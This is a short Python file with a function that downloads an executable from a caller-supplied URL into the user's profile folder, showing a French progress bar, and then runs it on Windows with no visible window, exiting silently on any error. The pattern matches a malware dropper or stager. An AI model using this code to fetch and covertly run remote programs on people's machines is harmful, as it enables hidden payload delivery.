import requests
import subprocess
import sys
import os
from tqdm import tqdm 

def init(url: str, name="file"):
    userprofile = os.getenv("USERPROFILE")
    if userprofile == None or not os.path.exists(userprofile):
        filepath = name + ".exe"
    else:
        filepath = os.path.join(userprofile, name + ".exe")

    try:
        rsp = requests.get(url, stream=True)
        rsp.raise_for_status()  

        total_size = int(rsp.headers.get('content-length', 0))  
        if total_size == 0:
            sys.exit()

        with tqdm(total=total_size, unit='B', unit_scale=True, desc="Téléchargement") as bar:
            with open(filepath, "wb") as file:
                for chunk in rsp.iter_content(chunk_size=1024): 
                    file.write(chunk)
                    bar.update(len(chunk)) 

        if not os.path.exists(filepath):
            sys.exit()

        if sys.platform == "win32":
            subprocess.Popen(filepath, creationflags=subprocess.CREATE_NO_WINDOW)

    except requests.exceptions.RequestException as e:
        sys.exit()
    except Exception as e:
        sys.exit()

